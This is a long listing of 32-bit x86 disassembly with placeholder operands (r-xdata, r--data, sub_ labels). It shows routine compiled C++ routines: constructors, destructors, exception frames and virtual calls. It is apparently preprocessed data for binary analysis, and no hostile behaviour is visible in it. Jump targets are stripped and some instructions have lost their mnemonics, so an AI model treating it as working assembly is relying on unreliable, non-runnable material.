mov ecx eax
jmp r-xdata
test esi esi
ja r-xdata
mov dl [ edi ]
dec esi
mov [ ecx ] dl
inc ecx
inc edi
pop edi
pop esi
retn
sub_40ac2c
push 0x0
mov eax sub_43deb5
call sub_425dad
mov ebx [ ebp + 0x8 ]
xor esi esi
mov [ ebp - 0x4 ] esi
mov [ ebx + 0x4 ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0xc ] r--data
lea edi [ ebx + 0x10 ]
mov [ ebx ] r--data
mov [ ebx + 0x4 ] r--data
mov [ ebx + 0x8 ] r--data
mov [ ebx + 0xc ] r--data
call sub_404957
lea edi [ ebx + 0xb8 ]
call sub_404957
mov [ ebx + 0x160 ] esi
mov [ ebx + 0x164 ] esi
mov [ ebx + 0x168 ] esi
mov [ ebx + 0x16c ] esi
lea esi [ ebx + 0x170 ]
call sub_403dae
lea esi [ ebx + 0x18c ]
call sub_403dae
push rw-data
lea ecx [ ebx + 0x1a8 ]
mov [ ebp - 0x4 ] 0x7
call sub_403de3
push [ ebp + 0xc ]
lea ecx [ ebx + 0x1c4 ]
mov [ ebp - 0x4 ] 0x8
call sub_403de3
push r--data
lea ecx [ ebx + 0x1e0 ]
mov [ ebp - 0x4 ] 0x9
call sub_403dc1
push [ ebp + 0x10 ]
lea ecx [ ebx + 0x1fc ]
mov [ ebp - 0x4 ] 0xa
call sub_403de3
lea esi [ ebx + 0x218 ]
call sub_403dae
mov [ ebp - 0x4 ] 0xc
or [ ebx + 0x240 ] 0xffffffff
lea eax [ ebx + 0x248 ]
push eax
mov [ ebx + 0x234 ] 0x0
mov [ ebx + 0x235 ] 0x0
mov [ ebx + 0x236 ] 0x1
mov [ ebx + 0x237 ] 0x0
mov [ ebx + 0x238 ] 0x0
mov [ ebx + 0x239 ] 0x1
mov [ ebx + 0x23c ] 0x1
mov [ ebx + 0x244 ] 0xffff
call sub_40f0f4
lea eax [ ebx + 0x264 ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_40eda3
lea eax [ ebx + 0x284 ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_40ef37
lea eax [ ebx + 0x2a4 ]
push eax
mov [ ebp - 0x4 ] 0xf
call sub_40f0f4
lea eax [ ebx + 0x2c0 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_40f0f4
lea eax [ ebx + 0x2dc ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_40f0f4
lea eax [ ebx + 0x2f8 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_40f131
lea eax [ ebx + 0x314 ]
push eax
mov [ ebp - 0x4 ] 0x13
call sub_40f0f4
lea eax [ ebx + 0x330 ]
push eax
mov [ ebp - 0x4 ] 0x14
call sub_40f214
lea eax [ ebx + 0x34c ]
push eax
mov [ ebp - 0x4 ] 0x15
call sub_403eef
mov [ ebp - 0x4 ] 0x16
xor esi esi
lea edi [ ebx + 0x384 ]
mov [ ebx + 0x368 ] esi
mov [ ebx + 0x36c ] esi
mov [ ebx + 0x370 ] esi
mov [ ebx + 0x374 ] esi
mov [ ebx + 0x378 ] esi
mov [ ebx + 0x37c ] esi
mov [ ebx + 0x380 ] esi
call sub_414983
lea eax [ ebx + 0x3b4 ]
mov [ ebp - 0x4 ] 0x17
push eax
mov [ ebx + 0x3ac ] esi
mov [ ebx + 0x3b0 ] esi
call sub_404a6d
lea esi [ ebx + 0x3d4 ]
call sub_403dae
xor eax eax
mov [ ebp - 0x4 ] 0x19
mov edi ebx
mov [ ebx + 0x3f0 ] eax
mov [ ebx + 0x438 ] eax
mov [ ebx + 0x43c ] eax
mov [ ebx + 0x440 ] al
call sub_40ae7e
mov eax ebx
call sub_425e4c
retn 0xc
sub_40ae7e
push 0x3c
mov eax sub_43dd3e
call sub_425dad
xor ebx ebx
cmp [ edi + 0x16c ] ebx
jne r-xdata
mov eax [ edi ]
mov ecx edi
mov [ edi + 0x3b0 ] ebx
mov [ edi + 0x238 ] bl
mov [ edi + 0x3f4 ] ebx
mov [ edi + 0x3f8 ] ebx
mov [ edi + 0x3fc ] ebx
mov [ edi + 0x400 ] ebx
mov [ edi + 0x404 ] ebx
mov [ edi + 0x408 ] ebx
mov [ edi + 0x40c ] ebx
mov [ edi + 0x410 ] ebx
mov [ edi + 0x414 ] ebx
mov [ edi + 0x418 ] ebx
mov [ edi + 0x41c ] ebx
mov [ edi + 0x420 ] ebx
mov [ edi + 0x424 ] ebx
mov [ edi + 0x428 ] ebx
mov [ edi + 0x42c ] ebx
mov [ edi + 0x430 ] ebx
mov [ edi + 0x434 ] bl
mov [ edi + 0x435 ] bl
call [ eax + 0x2c ]
call sub_425e4c
retn
push 0x148
call sub_4246c6
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor eax eax
push edi
push eax
call sub_410a29
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push r--data
lea ecx [ ebp - 0x48 ]
mov [ edi + 0x16c ] eax
call sub_403dc1
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_403dc1
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
mov esi [ edi + 0x16c ]
push eax
call sub_412aae
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
sub_40af95
push 0xc
mov eax sub_43dd09
call sub_425dad
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ edi + 0x4 ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0xc ] r--data
mov [ ebp - 0x4 ] 0x19
mov ecx [ edi + 0x160 ]
test ecx ecx
je r-xdata
mov ecx [ edi + 0x164 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ edi + 0x168 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ edi + 0x380 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ edi + 0x16c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
lea ebx [ edi + 0x2a4 ]
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
mov ecx [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
mov eax [ ecx ]
push 0x1
call [ eax ]
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
lea ebx [ edi + 0x2f8 ]
mov eax [ ebx + 0x14 ]
mov eax [ eax ]
mov ecx [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
call sub_423d5c
cmp [ ebp - 0x18 ] eax
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x0
push 0x1
lea ecx [ edi + 0x3d4 ]
call sub_40415f
lea eax [ edi + 0x3b4 ]
push eax
mov [ ebp - 0x4 ] 0x17
call sub_404bcd
lea ecx [ edi + 0x384 ]
mov [ ebp - 0x4 ] 0x16
call sub_4149df
lea eax [ edi + 0x34c ]
call sub_403f2c
lea esi [ edi + 0x330 ]
call sub_40f251
lea esi [ edi + 0x314 ]
call sub_40f06d
mov esi ebx
call sub_40f06d
lea esi [ edi + 0x2dc ]
call sub_40f06d
lea esi [ edi + 0x2c0 ]
call sub_40f06d
lea esi [ edi + 0x2a4 ]
call sub_40f06d
lea eax [ edi + 0x284 ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_412e49
lea eax [ edi + 0x264 ]
push eax
mov [ ebp - 0x4 ] 0xd
call sub_40fb35
lea esi [ edi + 0x248 ]
call sub_40f06d
xor esi esi
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ edi + 0x218 ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x1fc ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x1e0 ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x1c4 ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x1a8 ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x18c ]
call sub_40415f
push esi
push ebx
lea ecx [ edi + 0x170 ]
call sub_40415f
lea esi [ edi + 0xb8 ]
call sub_4011ad
lea esi [ edi + 0x10 ]
call sub_4011ad
mov [ edi + 0xc ] r--data
mov [ edi + 0x8 ] r--data
mov [ edi + 0x4 ] r--data
mov [ edi ] r--data
call sub_425e4c
retn
lea esi [ ebp - 0x18 ]
call sub_40f2a9
mov esi [ eax ]
test esi esi
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
cmp [ ebp - 0x18 ] 0x0
mov esi [ ebx + 0x14 ]
mov eax [ ebx ]
je r-xdata
lea esi [ ebp - 0x18 ]
call sub_408d54
jmp r-xdata
call sub_4011ad
push esi
call sub_42412e
pop ecx
cmp [ ebp - 0x18 ] 0x0
mov esi [ ebx + 0x14 ]
mov eax [ ebx ]
je r-xdata
sub_40b1ea
push 0x3c
mov eax sub_43c336
call sub_425dad
mov ebx [ ebp + 0x8 ]
xor esi esi
cmp [ ebx + 0x210 ] esi
jne r-xdata
cmp [ ebx + 0x380 ] esi
jne r-xdata
xor al al
jmp r-xdata
cmp [ ebx + 0x160 ] esi
jne r-xdata
push 0xa8
call sub_4246c6
mov edi eax
pop ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x4 ] esi
cmp edi esi
je r-xdata
call sub_425e4c
retn 0x4
mov eax [ ebx + 0x160 ]
cmp [ eax + 0x8 ] 0x1
jl r-xdata
push 0x50
call sub_4246c6
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
xor eax eax
mov eax ebx
call sub_4185e8
jmp r-xdata
cmp [ ebx + 0x164 ] esi
jne r-xdata
mov al 0x1
jmp r-xdata
xor eax eax
push [ ebx + 0x240 ]
lea ecx [ ebx + 0x1fc ]
push ecx
lea ecx [ ebx + 0x384 ]
lea eax [ ebx + 0x4 ]
push ecx
push eax
call sub_410330
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov [ ebx + 0x380 ] eax
mov ecx [ ebx + 0x164 ]
cmp ecx esi
je r-xdata
mov ecx ebx
call sub_40eca9
mov [ ebx + 0x164 ] eax
or [ ebp - 0x4 ] 0xffffffff
mov [ ebx + 0x160 ] eax
xor esi esi
lea eax [ ebx + 0x168 ]
cmp [ eax ] esi
jne r-xdata
mov eax [ ecx ]
lea edx [ ebx + 0x34c ]
push edx
call [ eax + 0x18 ]
mov ecx [ ebx + 0x164 ]
mov eax [ ecx ]
lea edx [ ebx + 0x170 ]
push edx
lea edx [ ebx + 0x18c ]
push edx
call [ eax + 0x20 ]
push rw-data
lea eax [ ebp - 0x48 ]
push r--data
push eax
call sub_40f984
push r--data
push eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40f9cf
add esp 0x18
push eax
push 0x8
push esi
add ebx 0x384
mov [ ebp - 0x4 ] 0x3
call sub_4149f1
xor ebx ebx
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_40415f
mov eax [ ebp + 0x8 ]
mov [ eax + 0x238 ] bl
mov eax [ eax + 0x160 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
neg eax
sbb eax eax
inc eax
mov [ eax ] esi
sub_40b36c
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43e4c3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x80
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x78 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x90 ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
xor esi esi
mov edi ecx
mov [ esp + 0x14 ] ebx
cmp ebx esi
jne r-xdata
push 0x2f4
call sub_4246c6
pop ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x98 ] 0x1
cmp eax esi
je r-xdata
push r--data
lea ecx [ esp + 0x1c ]
call sub_403dc1
lea eax [ esp + 0x18 ]
push eax
push 0x8
push esi
lea ebx [ edi + 0x384 ]
mov [ esp + 0xa4 ] esi
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push esi
push 0x1
lea ecx [ esp + 0x20 ]
call sub_40415f
mov eax [ edi ]
push 0x3
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
mov [ esp + 0x10 ] esi
push ebx
push eax
call sub_41c9c0
mov esi eax
mov [ esp + 0x10 ] esi
jmp r-xdata
mov ecx [ esp + 0x90 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x78 ]
xor ecx esp
call sub_4234de
mov esp ebp
pop ebp
retn 0x4
mov ebx [ esp + 0x14 ]
mov eax [ ebx ]
push r--data
mov ecx ebx
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
push r--data
lea ecx [ esp + 0x1c ]
call sub_403dc1
lea ecx [ esp + 0x18 ]
push ecx
lea ecx [ esp + 0x70 ]
mov [ esp + 0x9c ] 0x3
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
push 0x0
push 0x1
lea ecx [ esp + 0x20 ]
mov [ esp + 0xa0 ] 0x5
call sub_40415f
mov eax [ edi ]
lea ecx [ esp + 0x6c ]
push ecx
mov ecx edi
call [ eax + 0x1c ]
lea ecx [ esp + 0x34 ]
test al al
jne r-xdata
or [ esp + 0x98 ] 0xffffffff
mov eax [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
mov ecx esi
call [ eax + 0x4 ]
push eax
push 0x2000
lea ebx [ edi + 0x384 ]
push 0x0
mov [ esp + 0xa4 ] 0x2
call sub_4149f1
or [ esp + 0x98 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x20 ]
call sub_40415f
mov ecx [ esp + 0x14 ]
inc [ edi + 0x410 ]
mov eax [ ecx ]
push r--data
call [ eax + 0x28 ]
call sub_40563c
pop ecx
test al al
je r-xdata
mov eax [ edi ]
push esi
mov ecx edi
call [ eax + 0x24 ]
test al al
jne r-xdata
mov ecx esi
call sub_40d299
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x18 ]
jmp r-xdata
push r--data
call sub_403dc1
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x54 ]
mov [ esp + 0x9c ] 0x7
mov eax [ esi ]
push ecx
mov ecx esi
call [ eax + 0x40 ]
push 0xffffffff
xor ebx ebx
push ebx
push eax
lea ecx [ edi + 0x218 ]
mov [ esp + 0xa4 ] 0x8
call sub_40400a
push ebx
push 0x1
lea ecx [ esp + 0x58 ]
call sub_40415f
push ebx
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0xa0 ] 0x5
call sub_40415f
mov eax [ edi ]
mov ecx edi
call [ eax + 0x20 ]
or [ esp + 0x98 ] 0xffffffff
push ebx
push 0x1
lea ecx [ esp + 0x74 ]
call sub_40415f
jmp r-xdata
push r--data
call sub_403dc1
lea eax [ esp + 0x34 ]
push eax
push 0x8
push 0x0
mov [ esp + 0xa4 ] 0x6
call sub_4149f1
push 0x0
push 0x1
lea ecx [ esp + 0x3c ]
mov [ esp + 0xa0 ] 0x5
call sub_40415f
mov eax [ edi ]
push 0x2
mov ecx edi
call [ eax + 0x18 ]
push 0x0
push 0x1
lea ecx [ esp + 0x74 ]
call sub_40415f
jmp r-xdata
mov eax [ edi + 0x368 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x60 ]
dec eax
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov edx [ eax ]
sub esp 0x44
push 0x11
pop ecx
lea esi [ edi + 0x3f4 ]
mov edi esp
[ edi ] [ esi ]
mov ecx eax
call [ edx + 0x4 ]
mov esi [ esp + 0x10 ]
push esi
push edi
call sub_40dfb0
inc [ edi + 0x418 ]
dec eax
je r-xdata
mov ebx esi
mov ecx edi
call sub_40e438
inc [ edi + 0x420 ]
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_40df54
inc [ edi + 0x428 ]
jmp r-xdata
dec eax
je r-xdata
push esi
call sub_40de5c
inc [ edi + 0x430 ]
jmp r-xdata
push ebx
mov ebx edi
call sub_40ebbd
jmp r-xdata
sub_40b69a
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
lea eax [ esi + 0x15c ]
xor ebx ebx
cmp [ eax ] ebx
je r-xdata
lea eax [ esi + 0x158 ]
cmp [ eax ] ebx
je r-xdata
cmp [ esi + 0x22d ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x28 ]
push eax
push 0x8
mov [ ebp - 0x4 ] ebx
push 0x2
lea ebx [ esi + 0x37c ]
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ eax ]
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
mov eax [ eax ]
push [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x4 ]
jmp r-xdata
call sub_425e4c
retn 0x4
sub_40b719
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
xor edi edi
cmp [ esi + 0x378 ] edi
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x28 ]
push eax
push 0x8
push 0x2
lea ebx [ esi + 0x37c ]
mov [ ebp - 0x4 ] edi
call sub_4149f1
push edi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
push [ ebp + 0x8 ]
lea edi [ esi - 0x8 ]
call sub_40baf5
jmp r-xdata
call sub_425e4c
retn 0x4
sub_40b774
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
lea eax [ esi + 0x154 ]
cmp [ eax ] 0x0
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x8
push 0x2
lea ebx [ esi + 0x378 ]
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
mov eax [ eax ]
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0xc ]
jmp r-xdata
call sub_425e4c
retn 0x8
sub_40b7d3
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
lea eax [ esi + 0x15c ]
xor ebx ebx
cmp [ eax ] ebx
je r-xdata
cmp [ esi + 0x374 ] ebx
je r-xdata
cmp [ esi + 0x228 ] bl
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x28 ]
push eax
push 0x8
mov [ ebp - 0x4 ] ebx
push 0x2
lea ebx [ esi + 0x378 ]
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
push [ ebp + 0xc ]
lea edi [ esi - 0xc ]
call sub_40baf5
jmp r-xdata
mov eax [ eax ]
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
jmp r-xdata
call sub_425e4c
retn 0x8
sub_40b84f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_43b25a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x50 ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push r--data
lea ecx [ esp + 0x34 ]
call sub_403dc1
push 0x2
pop eax
lea ecx [ esp + 0x30 ]
push ecx
push 0x8
push eax
lea ebx [ esi + 0x378 ]
mov [ esp + 0x64 ] eax
call sub_4149f1
or [ esp + 0x58 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x38 ]
call sub_40415f
lea ecx [ esi - 0xc ]
mov eax [ ecx ]
push [ ebp + 0x10 ]
lea edi [ esi - 0xc ]
mov ebx edi
call sub_40dccc
lea ecx [ esp + 0x14 ]
test al al
jne r-xdata
push r--data
call sub_403dc1
lea eax [ esp + 0x14 ]
push eax
push 0x8
push 0x0
lea ebx [ esi + 0x378 ]
mov [ esp + 0x64 ] 0x1
call sub_4149f1
or [ esp + 0x58 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x1c ]
call sub_40415f
mov ecx edi
call sub_40bc8c
jmp r-xdata
push r--data
call sub_403dc1
and [ esp + 0x58 ] 0x0
lea eax [ esp + 0x14 ]
push eax
push 0x8
push 0x2
lea ebx [ esi + 0x378 ]
call sub_4149f1
or [ esp + 0x58 ] 0xffffffff
push 0x0
push 0x1
lea ecx [ esp + 0x1c ]
call sub_40415f
mov eax [ edi ]
mov ecx edi
jmp r-xdata
mov ecx [ esp + 0x50 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push 0xd
call [ eax + 0x18 ]
sub_40b974
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov esi ecx
lea eax [ esi + 0x160 ]
xor ebx ebx
cmp [ eax ] ebx
je r-xdata
lea eax [ esi + 0x164 ]
cmp [ eax ] ebx
je r-xdata
cmp [ esi + 0x231 ] bl
jne r-xdata
cmp [ esi + 0x37c ] ebx
je r-xdata
cmp [ esi + 0x230 ] bl
je r-xdata
mov eax [ eax ]
push [ ebp + 0xc ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x8 ]
jmp r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
lea eax [ ebp - 0x28 ]
push eax
push 0x8
mov [ ebp - 0x4 ] ebx
push 0x2
lea ebx [ esi + 0x380 ]
call sub_4149f1
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_40415f
push [ ebp + 0xc ]
lea edi [ esi - 0x4 ]
call sub_40baf5
jmp r-xdata
call sub_425e4c
retn 0x8
sub_40ba02
push esi
mov esi ecx
lea ecx [ esi - 0x4 ]
call sub_40bc8c
cmp [ esi + 0x234 ] 0x0
je r-xdata
pop esi
retn 0x4
lea eax [ esi + 0x15c ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ eax ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x10 ]
sub_40ba2e
push ebx
push esi
mov esi ecx
lea eax [ esi + 0x15c ]
cmp [ eax ] 0x0
je r-xdata
push [ esp + 0x10 ]
lea ebx [ esi - 0x4 ]
call sub_40dc61
pop esi
pop ebx
retn 0x8
mov eax [ eax ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x18 ]
sub_40ba57
push 0x1c
mov eax sub_43c2f7
call sub_425dad
mov ebx ecx
mov eax [ ebx + 0x160 ]
test eax eax
je r-xdata
call sub_425e4c
retn 0x4
mov eax [ eax + 0x8 ]
cmp eax 0x1
jl r-xdata
cmp [ ebp + 0x8 ] 0xd
je r-xdata
mov ecx [ ebx + 0x160 ]
mov eax [ ecx ]
call [ eax + 0x14 ]
mov ecx [ ebx + 0x160 ]
mov eax [ ecx ]
call [ eax + 0x18 ]
mov esi [ ebx + 0x380 ]
call sub_418df5
mov ecx [ ebx + 0x164 ]
test ecx ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_403dc1
and [ ebp - 0x4 ] 0x0
lea edi [ ebp - 0x28 ]
mov esi ebx
call sub_40d0c2
or [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x1
mov ecx edi
call sub_40415f
push [ ebp + 0x8 ]
mov [ ebx + 0x235 ] 0x0
mov [ ebx + 0x234 ] 0x0
call sub_40dc61
mov eax [ ecx ]
call [ eax + 0xc ]
sub_40baf5
push 0x78
mov eax sub_43c2d1
call sub_425dad
xor esi esi
mov [ ebp - 0x10 ] esi
mov eax [ edi + 0x380 ]
cmp eax esi
je r-xdata
call sub_425e4c
retn 0x4
push [ ebp + 0x8 ]
push eax
call sub_4186c3
test al al
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4c ]
push r--data
push eax
call sub_40f984
add esp 0xc
push eax
push 0x8
push 0x2
lea ebx [ edi + 0x384 ]
mov [ ebp - 0x4 ] esi
call sub_4149f1
or [ ebp - 0x4 ] 0xffffffff
xor ebx ebx
push esi
inc ebx
push ebx
lea ecx [ ebp - 0x4c ]
call sub_40415f
lea esi [ ebx + 0x7f ]
push esi
call sub_4246c6
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
test eax eax
je r-xdata
and [ ebp + 0x8 ] 0x0
push r--data
lea ecx [ ebp - 0x4c ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x2
push r--data
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x10 ] ebx
call sub_403dc1
push 0x3
pop eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] eax
push 0x0
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x8 ]
call sub_41ec78
mov [ ebp + 0x8 ] eax
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
push 0x0
push ebx
lea ecx [ ebp - 0x30 ]
call sub_40415f
test [ ebp - 0x10 ] 0x2
je r-xdata
push esi
call sub_4246c6
pop ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x6
test eax eax
je r-xdata
and [ ebp - 0x10 ] 0xfffffffe
push 0x0
push ebx
lea ecx [ ebp - 0x4c ]
call sub_40415f
test [ ebp - 0x10 ] 0x8
je r-xdata
push r--data
lea ecx [ ebp - 0x84 ]
call sub_403dc1
mov [ ebp - 0x4 ] 0x7
or [ ebp - 0x10 ] 0x4
push r--data
lea ecx [ ebp - 0x68 ]
call sub_403dc1
push 0x8
pop eax
mov [ ebp - 0x4 ] eax
or [ ebp - 0x10 ] eax
mov ebx [ ebp + 0x8 ]
push rw-data
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x68 ]
push eax
push [ ebp - 0x14 ]
call sub_41ee71
xor ebx ebx
inc ebx
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x4
je r-xdata
and [ ebp - 0x10 ] 0xfffffff7
push 0x0
push ebx
lea ecx [ ebp - 0x68 ]
call sub_40415f
push [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
mov eax [ edi ]
push 0x8
mov ecx edi
call [ eax + 0x18 ]
push 0x0
push ebx
lea ecx [ ebp - 0x84 ]
call sub_40415f
sub_40bc8c
push 0x94
mov eax sub_43b21a
call sub_425e16
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] edi
call sub_403dc1
lea eax [ edi + 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
push r--data
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_40f9cf
add esp 0xc
lea ecx [ edi + 0x1a8 ]
push ecx
push eax
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40fa15
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x84 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_40f9cf
add esp 0xc
push 0xffffffff
push ebx
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_404233
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x84 ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0xa0 ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0x68 ]
call sub_40415f
push ebx
push esi
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] bl
call sub_40415f
add edi 0x1e0
push edi
lea eax [ ebp - 0x68 ]
push r--data
push eax
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_40f9cf
add esp 0xc
push 0xffffffff
push ebx
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x6
call sub_404233
xor edi edi
push ebx
inc edi
push edi
lea ecx [ ebp - 0x4c ]
call sub_40415f
push ebx
push edi
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] bl
call sub_40415f
push rw-data
lea eax [ ebp - 0x84 ]
push r--data
push eax
call sub_40f984
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xa0 ]
push eax
mov [ ebp - 0x4 ] 0x7
call sub_40f9cf
add esp 0xc
push rw-data
push eax
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_40fa15
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0x4c ]
push eax
mov [ ebp - 0x4 ] 0x9
call sub_40f9cf
add esp 0xc
push 0xffffffff
push ebx
mov [ ebp - 0x4 ] 0xa
